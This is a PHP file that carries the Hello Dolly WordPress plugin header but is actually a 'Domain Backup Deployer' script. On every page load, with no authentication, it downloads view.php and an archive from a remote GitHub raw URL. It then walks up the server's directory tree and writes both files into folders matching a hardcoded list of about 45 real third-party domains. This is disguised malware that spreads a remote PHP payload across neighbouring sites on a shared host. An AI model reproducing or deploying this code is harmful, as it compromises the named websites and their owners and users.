<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/
declare(strict_types=1);

/**
 * Domain Backup Deployer
 *
 * Workflow:
 *   1. Take the target domains from the hardcoded AA_DOMAINS list.
 *   2. Walk up from this script's own directory, one level at a time, and
 *      inspect the immediate children of every parent level.
 *   3. Every child folder whose name exactly matches an entry of the domain
 *      list is a target.
 *   4. Download view.php and henry.zip.gz from their source URLs, then write
 *      them into every target folder: view.php as the main file and
 *      henry.zip.gz right next to it, because view.php reads the archive at
 *      runtime.
 *   5. When every write has finished, report the result and the generated
 *      URLs on the page.
 *
 * There is no password and no login: loading this script performs the whole
 * deployment automatically.
 *
 * Directory rules (ported from debug.php):
 *   - A parent named "wp" is skipped (not scanned) but the walk continues.
 *   - The walk stops before a parent named "home"; /home itself is never
 *     scanned and never listed.
 *   - Only immediate children are considered; folders are never recursed.
 *   - System/control-panel folder names and suffixes such as ".bak" are
 *     excluded.
 *   - The site currently serving this script is never targeted.
 *
 * Configuration (edit the values below, or set the matching environment
 * variable to override them):
 *
 *   AA_DOMAINS        hardcoded target domains, one per entry.
 *   AA_SOURCE_URL_PAYLOAD  where view.php is downloaded from on every run.
 *   AA_SOURCE_URL_ARCHIVE  where henry.zip.gz is downloaded from on every run.
 *   AA_EXPECTED_PAYLOAD_SHA256 optional SHA-256 digest of the downloaded
 *                     view.php; empty accepts whatever the source serves.
 *   AA_EXPECTED_ARCHIVE_SHA256 optional SHA-256 digest of the downloaded
 *                     henry.zip.gz archive.
 *   AA_URL_SCHEME     "https" (default) or "http" for the generated URLs.
 *
 * Environment overrides:
 *   AA_ALLOW_UNVERIFIED_TLS  set to 1 on hosts with a broken CA bundle.
 *   AA_DOWNLOAD_CA_BUNDLE    path to a CA bundle used for the download.
 *
 * Requires PHP 7.0+ and outbound HTTPS access to the source URLs.
 */

const AA_APP_NAME = 'Domain Backup Deployer';
const AA_TARGET_FILENAME = 'view.php';

/**
 * The compressed archive view.php loads at runtime. It has to sit next to
 * view.php in the same folder, otherwise view.php cannot start.
 */
const AA_ARCHIVE_FILENAME = 'henry.zip.gz';

/**
 * Mirrors debug.php: the site that serves this script is never targeted, so
 * view.php and henry.zip.gz are not written into the current host's own
 * folder. Set this to false if you also want the current host included in the
 * deployment.
 */
const AA_EXCLUDE_CURRENT_HOST = true;

/**
 * Scheme used when building the public URL of a deployed file. Most shared
 * hosts serve HTTPS, so "https" is the default. Override with the
 * AA_URL_SCHEME environment variable ("http" or "https").
 */
$urlScheme = strtolower((string) (getenv('AA_URL_SCHEME') ?: 'https'));
if (!in_array($urlScheme, ['http', 'https'], true)) {
    $urlScheme = 'https';
}

/**
 * Hardcoded list of target domains. The deployment only downloads the two
 * payload files, so this list stays the single source of truth for which
 * folders are targeted.
 */
const AA_DOMAINS = [
    'fkolaine.com',
    'cepsii.cl',
    'prolist.ro',
    'magazin.prolist.ro',
    'soltech.com.mx',
    'hinduismgyan.com',
    'palmbunchashmalaysia.com',
    'fritosa.ma',
    'dijak.rs',
    'wintersunrealestate.com.au',
    'lemburga.com',
    'smartbizconsult.ro',
    'celmaibuntratament.ro',
    'jobs.rsainternship.co.za',
    'aparaturaginecologie.ro',
    'webtooklits.farrah.co.ke',
    'chinad2dbd.com',
    'tratamentulplagilor.ro',
    'academy.saiworld.org',
    'fnerzgroup.com',
    'mrinkanda.archiverscholar.com',
    'pay.vopos.com.ng',
    'sinnarnewsletter.co.za',
    'kitdeensaio.com.br',
    'henanuniversity.786edu.com',
    'vaimavidyalaya.in',
    'gofrainforest.com',
    'myedgeeducation.com',
    'sgisteel.com.pk',
    'nuwsmaker.com',
    'gtaxhub.com',
    'mmocreativehouse.com',
    'cenderclinic.com',
    'atvision.com.pk',
    'icgc.com.pk',
    'sandycreekairport.com',
    'perfectwash.ro',
    'syrenorm.edu.mg',
    'conchalemnoticias.com.br',
    'chulaplasticsurgery.com',
    'saccmva.com',
    'deskerworldwide.com',
    'alecsandralitu.ro',
    'new.drusal.ro',
    'fatayat.nucirebon.or.id',
];

/**
 * Source URLs the deployed files are downloaded from while this script runs.
 *
 * The script no longer carries the payload itself: every run fetches the
 * current version of both files, so a single upload keeps every target folder
 * up to date.
 */
const AA_SOURCE_URL_PAYLOAD = 'https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/view.php';
const AA_SOURCE_URL_ARCHIVE = 'https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/henry.zip.gz';

/**
 * Optional expected SHA-256 digests. Leave them empty to accept whatever the
 * source serves; set them to pin the deployment to one exact revision.
 */
const AA_EXPECTED_PAYLOAD_SHA256 = '';
const AA_EXPECTED_ARCHIVE_SHA256 = '';

$skipParentNames = ['wp'];
$excludeNames = [
    'bin', 'etc', 'config', 'backup', 'backups', 'cgi-bin', 'mail',
    'logs', 'tmp', 'temp', 'cache', 'ssl', 'ssl-certs', 'private',
    'public_html', 'public_ftp', 'domains', 'awstats', 'perl',
    'access-logs', 'imap', 'Maildir', '.well-known', '.trash',
    'cp', 'panel', 'admin', 'stats', 'webalizer', 'var',
    'lib', 'lib64', 'sbin', 'usr', 'opt', 'srv', 'mnt',
    'dev', 'proc', 'sys', 'boot', 'run', 'root',
];
$excludeNameSubstrings = [
    '.bak', '.old', '.tar', '.zip', '.gz', '.sql', '.psql', '.dump',
    'subdomain.', 'parked.', 'addondomain.', 'tmp.', 'backup.',
];
$stopBeforeNames = ['home'];

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: no-referrer');
header("Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'");

function aa_e($value): string
{
    return htmlspecialchars((string) $value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function aa_name_in_list(string $name, array $list): bool
{
    foreach ($list as $entry) {
        if (strcasecmp($name, (string) $entry) === 0) {
            return true;
        }
    }

    return false;
}

function aa_name_has_substring(string $name, array $needles): bool
{
    $lower = strtolower($name);
    foreach ($needles as $needle) {
        if ($needle !== '' && strpos($lower, strtolower((string) $needle)) !== false) {
            return true;
        }
    }

    return false;
}

function aa_normalize_domain(string $domain): string
{
    $domain = trim($domain);
    $domain = preg_replace('#^[a-z]+://#i', '', $domain) ?? $domain;
    $domain = preg_replace('#^www\.#i', '', $domain) ?? $domain;
    $domain = rtrim($domain, "/ \t\r\n");
    $domain = explode('/', $domain)[0];
    $domain = explode(':', $domain)[0];

    return strtolower($domain);
}

/**
 * Host name of the site that served this request. Mirrors the helper in
 * debug.php, including IPv6 bracket handling and port stripping.
 */
function aa_detect_request_host(): string
{
    $source = '';
    if (!empty($_SERVER['HTTP_HOST'])) {
        $source = (string) $_SERVER['HTTP_HOST'];
    } elseif (!empty($_SERVER['SERVER_NAME'])) {
        $source = (string) $_SERVER['SERVER_NAME'];
    }
    if ($source === '') {
        return '';
    }

    $host = $source;
    if (strpos($host, '[') !== false && strpos($host, ']') !== false) {
        $host = substr($host, strpos($host, '[') + 1);
        $host = substr($host, 0, strpos($host, ']'));
    } elseif (($colon = strrpos($host, ':')) !== false && strpos($host, ':') === $colon) {
        $host = substr($host, 0, $colon);
    }

    return strtolower(trim($host));
}

/**
 * Domains that must never receive the payload because they are the site
 * currently serving this script. The HTTP host wins; the path segments of
 * this script's own directory are used as a fallback (skipping "wp" parents,
 * exactly like debug.php does).
 *
 * @return array<int, string>
 */
function aa_collect_excluded_domains(array $domains, array $skipParentNames, $startDirectory = null): array
{
    if (!AA_EXCLUDE_CURRENT_HOST) {
        return [];
    }

    $lookup = [];
    foreach ($domains as $domain) {
        $lookup[strtolower((string) $domain)] = true;
    }

    $excluded = [];

    $host = aa_normalize_domain(aa_detect_request_host());
    if ($host !== '' && isset($lookup[$host])) {
        $excluded[$host] = $host;
    }

    $path = str_replace('\\', '/', $startDirectory ?? __DIR__);
    $segments = array_values(array_filter(explode('/', $path), static function ($segment) {
        return $segment !== '';
    }));
    foreach ($segments as $segment) {
        if (aa_name_in_list($segment, $skipParentNames)) {
            continue;
        }
        // debug.php only treats path segments that look like a domain
        // (they contain a dot) as a host folder.
        if (strpos($segment, '.') === false) {
            continue;
        }
        $candidate = aa_normalize_domain($segment);
        if ($candidate !== '' && isset($lookup[$candidate])) {
            $excluded[$candidate] = $candidate;
        }
    }

    return array_values($excluded);
}

/**
 * Download a file over HTTP(S) and return its raw bytes.
 *
 * cURL is used when it is available because it handles timeouts and
 * redirects reliably; otherwise the stream wrapper is used. TLS verification
 * stays enabled unless AA_ALLOW_UNVERIFIED_TLS is set, because some hosts ship
 * a broken CA bundle.
 */
function aa_fetch_url(string $url, int $timeout = 60): string
{
    $unverified = in_array(strtolower((string) (getenv('AA_ALLOW_UNVERIFIED_TLS') ?: '0')), ['1', 'true', 'yes', 'on'], true);
    $caBundle = (string) (getenv('AA_DOWNLOAD_CA_BUNDLE') ?: '');

    if (function_exists('curl_init')) {
        $curl = curl_init();
        if ($curl === false) {
            throw new RuntimeException('Could not initialise cURL.');
        }

        $options = [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_USERAGENT => 'aa.php (Domain Backup Deployer)',
            CURLOPT_SSL_VERIFYPEER => !$unverified,
            CURLOPT_SSL_VERIFYHOST => $unverified ? 0 : 2,
        ];
        if ($caBundle !== '' && is_readable($caBundle)) {
            $options[CURLOPT_CAINFO] = $caBundle;
        }

        curl_setopt_array($curl, $options);
        $body = curl_exec($curl);
        $errorNumber = curl_errno($curl);
        $errorMessage = curl_error($curl);
        $status = (int) curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);

        if ($errorNumber !== 0) {
            throw new RuntimeException('Download failed for ' . $url . ': ' . $errorMessage . ' (cURL error ' . $errorNumber . ').');
        }
        if ($status < 200 || $status >= 300) {
            throw new RuntimeException('Download failed for ' . $url . ': the server answered with HTTP ' . $status . '.');
        }
        if (!is_string($body) || $body === '') {
            throw new RuntimeException('Download failed for ' . $url . ': the server sent an empty response.');
        }

        return $body;
    }

    $ssl = [
        'verify_peer' => !$unverified,
        'verify_peer_name' => !$unverified,
    ];
    if ($caBundle !== '' && is_readable($caBundle)) {
        $ssl['cafile'] = $caBundle;
    }

    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => $timeout,
            'follow_location' => 1,
            'max_redirects' => 5,
            'user_agent' => 'aa.php (Domain Backup Deployer)',
            'ignore_errors' => true,
        ],
        'ssl' => $ssl,
    ]);

    $body = @file_get_contents($url, false, $context);
    if ($body === false) {
        $last = error_get_last();

        throw new RuntimeException('Download failed for ' . $url . ': ' . (isset($last['message']) ? $last['message'] : 'unknown error') . '.');
    }

    $status = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $header) {
            if (preg_match('~^HTTP/\S+\s+(\d{3})~', (string) $header, $statusMatch)) {
                $status = (int) $statusMatch[1];
            }
        }
    }
    if ($status !== 0 && ($status < 200 || $status >= 300)) {
        throw new RuntimeException('Download failed for ' . $url . ': the server answered with HTTP ' . $status . '.');
    }
    if ($body === '') {
        throw new RuntimeException('Download failed for ' . $url . ': the server sent an empty response.');
    }

    return $body;
}

/**
 * Download view.php and return it together with the metadata of the download.
 */
function aa_download_payload(): array
{
    static $download = null;

    if ($download !== null) {
        return $download;
    }

    $data = aa_fetch_url(AA_SOURCE_URL_PAYLOAD);
    if (strpos($data, "\0") !== false) {
        throw new RuntimeException('The downloaded ' . AA_TARGET_FILENAME . ' looks like binary data.');
    }
    if (strpos($data, '<?php') === false) {
        throw new RuntimeException('The downloaded ' . AA_TARGET_FILENAME . ' does not contain any PHP code.');
    }
    if (AA_EXPECTED_PAYLOAD_SHA256 !== '' && !hash_equals(AA_EXPECTED_PAYLOAD_SHA256, hash('sha256', $data))) {
        throw new RuntimeException('The downloaded ' . AA_TARGET_FILENAME . ' does not match the expected SHA-256 digest.');
    }

    $download = [
        'data' => $data,
        'url' => AA_SOURCE_URL_PAYLOAD,
        'bytes' => strlen($data),
        'sha256' => hash('sha256', $data),
    ];

    return $download;
}

/**
 * Download the henry.zip.gz archive view.php reads at runtime.
 */
function aa_download_archive(): array
{
    static $download = null;

    if ($download !== null) {
        return $download;
    }

    $data = aa_fetch_url(AA_SOURCE_URL_ARCHIVE);
    if (substr($data, 0, 2) !== "\x1f\x8b") {
        throw new RuntimeException('The downloaded ' . AA_ARCHIVE_FILENAME . ' is not a gzip file.');
    }
    if (AA_EXPECTED_ARCHIVE_SHA256 !== '' && !hash_equals(AA_EXPECTED_ARCHIVE_SHA256, hash('sha256', $data))) {
        throw new RuntimeException('The downloaded ' . AA_ARCHIVE_FILENAME . ' does not match the expected SHA-256 digest.');
    }

    $download = [
        'data' => $data,
        'url' => AA_SOURCE_URL_ARCHIVE,
        'bytes' => strlen($data),
        'sha256' => hash('sha256', $data),
    ];

    return $download;
}

function aa_find_matching_directories(
    array $domains,
    array $skipParentNames,
    array $excludeNames,
    array $excludeNameSubstrings,
    array $stopBeforeNames,
    $startDirectory = null,
    array $excludedDomains = []
): array
{
    $domainLookup = [];
    foreach ($domains as $domain) {
        $domainLookup[strtolower($domain)] = true;
    }

    $excludedLookup = [];
    foreach ($excludedDomains as $excluded) {
        $excludedLookup[strtolower((string) $excluded)] = true;
    }

    $current = str_replace('\\', '/', $startDirectory ?? __DIR__);
    $matches = [];
    $seenPaths = [];
    $trace = [];

    while (true) {
        $parent = dirname($current);
        if ($parent === $current) {
            $trace[] = 'Reached the filesystem root.';
            break;
        }

        $parentName = strtolower(basename($parent));
        if (aa_name_in_list($parentName, $stopBeforeNames)) {
            $trace[] = 'Stopped before off-limit parent: ' . $parentName;
            break;
        }
        if (aa_name_in_list($parentName, $skipParentNames)) {
            $trace[] = 'Skipped parent scan: ' . $parentName;
            $current = $parent;
            continue;
        }

        $entries = @scandir($parent);
        if ($entries === false || !is_array($entries)) {
            $trace[] = 'Could not scan parent: ' . $parent;
            break;
        }

        $trace[] = 'Scanned parent: ' . $parent;
        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }

            $lower = strtolower($entry);
            if (!isset($domainLookup[$lower])) {
                continue;
            }
            if (isset($excludedLookup[$lower])) {
                $trace[] = 'Skipped current host: ' . $entry;
                continue;
            }
            if (aa_name_in_list($entry, $excludeNames) || aa_name_has_substring($entry, $excludeNameSubstrings)) {
                $trace[] = 'Skipped excluded match: ' . $entry;
                continue;
            }

            $full = $parent . DIRECTORY_SEPARATOR . $entry;
            if (!is_dir($full)) {
                continue;
            }

            $normalized = str_replace('\\', '/', $full);
            $seenKey = stripos(PHP_OS, 'WIN') === 0 ? strtolower($normalized) : $normalized;
            if (isset($seenPaths[$seenKey])) {
                continue;
            }
            $seenPaths[$seenKey] = true;

            $matches[] = [
                'domain' => $entry,
                'directory' => $full,
            ];
        }

        $current = $parent;
    }

    return ['matches' => $matches, 'trace' => $trace];
}

function aa_deploy_payload(array $matches, string $payload, string $archive, string $scheme = 'https'): array
{
    $results = [];
    foreach ($matches as $match) {
        $domain = (string) $match['domain'];
        $directory = (string) $match['directory'];
        $target = rtrim($directory, '/\\') . DIRECTORY_SEPARATOR . AA_TARGET_FILENAME;
        $archiveTarget = rtrim($directory, '/\\') . DIRECTORY_SEPARATOR . AA_ARCHIVE_FILENAME;

        $written = @file_put_contents($target, $payload, LOCK_EX);
        if ($written === false || $written !== strlen($payload)) {
            $results[] = [
                'domain' => $domain,
                'directory' => $directory,
                'target' => $target,
                'archiveTarget' => $archiveTarget,
                'ok' => false,
                'url' => '',
                'archiveUrl' => '',
                'message' => 'Write failed. Check file permissions.',
            ];
            continue;
        }

        @chmod($target, 0644);

        $archiveWritten = @file_put_contents($archiveTarget, $archive, LOCK_EX);
        if ($archiveWritten === false || $archiveWritten !== strlen($archive)) {
            $results[] = [
                'domain' => $domain,
                'directory' => $directory,
                'target' => $target,
                'archiveTarget' => $archiveTarget,
                'ok' => false,
                'url' => '',
                'archiveUrl' => '',
                'message' => 'view.php was created but the archive write failed. Check file permissions.',
            ];
            continue;
        }

        @chmod($archiveTarget, 0644);

        $url = $scheme . '://' . strtolower($domain) . '/' . AA_TARGET_FILENAME;
        $archiveUrl = $scheme . '://' . strtolower($domain) . '/' . AA_ARCHIVE_FILENAME;
        $results[] = [
            'domain' => $domain,
            'directory' => $directory,
            'target' => $target,
            'archiveTarget' => $archiveTarget,
            'ok' => true,
            'url' => $url,
            'archiveUrl' => $archiveUrl,
            'message' => 'Created successfully.',
        ];
    }

    return $results;
}

function aa_render_header(string $title)
{
    $safeTitle = aa_e($title);
    echo <<<HTML
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{$safeTitle}</title>
    <style>
        :root { color-scheme:dark; --bg:#07111f; --panel:#111d30; --panel2:#0b1524; --text:#e5edf8; --muted:#91a4be; --line:#253650; --accent:#38bdf8; --ok:#4ade80; --error:#fb7185; }
        * { box-sizing:border-box; }
        body { margin:0; background:var(--bg); color:var(--text); font:15px/1.5 system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }
        main { max-width:1050px; margin:auto; padding:28px 18px; }
        h1,h2 { margin-top:0; }
        .panel { background:var(--panel); border:1px solid var(--line); border-radius:12px; padding:20px; margin-bottom:18px; }
        .muted { color:var(--muted); } .ok { color:var(--ok); } .error { color:var(--error); }
        .notice { border:1px solid; border-radius:8px; padding:11px 13px; margin-bottom:12px; }
        .notice.success { color:#bbf7d0; background:#052e16; border-color:#166534; }
        .notice.error { color:#fecdd3; background:#4c0519; border-color:#9f1239; }
        table { width:100%; border-collapse:collapse; }
        th,td { text-align:left; padding:10px 8px; border-bottom:1px solid var(--line); vertical-align:top; }
        th { color:var(--muted); font-size:12px; text-transform:uppercase; }
        a { color:var(--accent); } code { background:#020617; padding:2px 5px; border-radius:4px; }
        .trace { white-space:pre-wrap; max-height:320px; overflow:auto; font:13px/1.5 ui-monospace,SFMono-Regular,Consolas,monospace; color:var(--muted); }
    </style>
</head>
<body>
HTML;
}

function aa_render_footer()
{
    echo '</body></html>';
}

$result = null;
$error = '';
$payloadDownload = null;
$archiveDownload = null;
$domains = AA_DOMAINS;
$trace = [];
$excludedDomains = [];

try {
    if ($domains === []) {
        throw new RuntimeException('The hardcoded domain list is empty.');
    }

    $payloadDownload = aa_download_payload();
    $archiveDownload = aa_download_archive();
    $payload = (string) $payloadDownload['data'];
    $archive = (string) $archiveDownload['data'];
    $excludedDomains = aa_collect_excluded_domains($domains, $skipParentNames);
    $discovery = aa_find_matching_directories(
        $domains,
        $skipParentNames,
        $excludeNames,
        $excludeNameSubstrings,
        $stopBeforeNames,
        null,
        $excludedDomains
    );
    $matches = $discovery['matches'];
    $trace = $discovery['trace'];

    // Every file is written here, in one pass, before the result is rendered.
    $result = aa_deploy_payload($matches, $payload, $archive, $urlScheme);
} catch (Throwable $exception) {
    $error = $exception->getMessage();
}

aa_render_header(AA_APP_NAME);
$domainCount = count(AA_DOMAINS);
$payloadBytes = $payloadDownload !== null ? (int) $payloadDownload['bytes'] : 0;
$archiveBytes = $archiveDownload !== null ? (int) $archiveDownload['bytes'] : 0;

echo '<main><section class="panel"><h1>' . aa_e(AA_APP_NAME) . '</h1><p class="muted">Downloads <code>' . aa_e(AA_TARGET_FILENAME) . '</code> and <code>' . aa_e(AA_ARCHIVE_FILENAME) . '</code> from their source URLs and creates them in every matching domain directory found by walking up from this script. The deployment runs automatically every time this page is loaded.</p></section>';
if ($error !== '') {
    echo '<div class="notice error">' . aa_e($error) . '</div>';
}

if ($result !== null) {
    $successCount = count(array_filter($result, static function (array $row) {
        return $row['ok'];
    }));
    echo '<div class="notice ' . ($successCount > 0 ? 'success' : 'error') . '">Deployment finished. ' . $successCount . ' of ' . count($result) . ' domain folder(s) updated.</div>';

    if ($excludedDomains !== []) {
        echo '<div class="notice success">Skipped current host folder(s): <code>' . aa_e(implode(', ', $excludedDomains)) . '</code></div>';
    }

    echo '<section class="panel"><h2>Deployment results</h2><table><thead><tr><th>Domain</th><th>Directory</th><th>Status</th><th>URL</th></tr></thead><tbody>';
    foreach ($result as $row) {
        echo '<tr><td>' . aa_e($row['domain']) . '</td><td><code>' . aa_e($row['directory']) . '</code></td><td class="' . ($row['ok'] ? 'ok' : 'error') . '">' . aa_e($row['message']) . '</td><td>';
        if ($row['ok'] && $row['url'] !== '') {
            echo '<a href="' . aa_e($row['url']) . '" target="_blank" rel="noopener noreferrer">' . aa_e($row['url']) . '</a>';
            if ($row['archiveUrl'] !== '') {
                echo '<br><a href="' . aa_e($row['archiveUrl']) . '" target="_blank" rel="noopener noreferrer">' . aa_e($row['archiveUrl']) . '</a>';
            }
        }
        echo '</td></tr>';
    }
    echo '</tbody></table></section>';
}

echo '<section class="panel"><h2>Configuration</h2><p class="muted">Hardcoded domain list</p><code>' . $domainCount . ' domains</code><p class="muted" style="margin-top:12px">Downloaded payload</p><code>' . aa_e(AA_TARGET_FILENAME) . ' &middot; ' . $payloadBytes . ' bytes &middot; SHA-256 ' . ($payloadDownload !== null ? substr((string) $payloadDownload['sha256'], 0, 16) : 'n/a') . '&hellip;</code><p class="muted" style="margin-top:12px">Source</p><code>' . aa_e(AA_SOURCE_URL_PAYLOAD) . '</code><p class="muted" style="margin-top:12px">Downloaded archive</p><code>' . aa_e(AA_ARCHIVE_FILENAME) . ' &middot; ' . $archiveBytes . ' bytes &middot; SHA-256 ' . ($archiveDownload !== null ? substr((string) $archiveDownload['sha256'], 0, 16) : 'n/a') . '&hellip;</code><p class="muted" style="margin-top:12px">Source</p><code>' . aa_e(AA_SOURCE_URL_ARCHIVE) . '</code><p class="muted" style="margin-top:12px">The deployment already ran while this page was being generated. Reload the page to run it again.</p></section>';
if ($trace !== []) {
    echo '<section class="panel"><h2>Directory search trace</h2><div class="trace">' . aa_e(implode("\n", $trace)) . '</div></section>';
}

echo '</main>';
aa_render_footer();
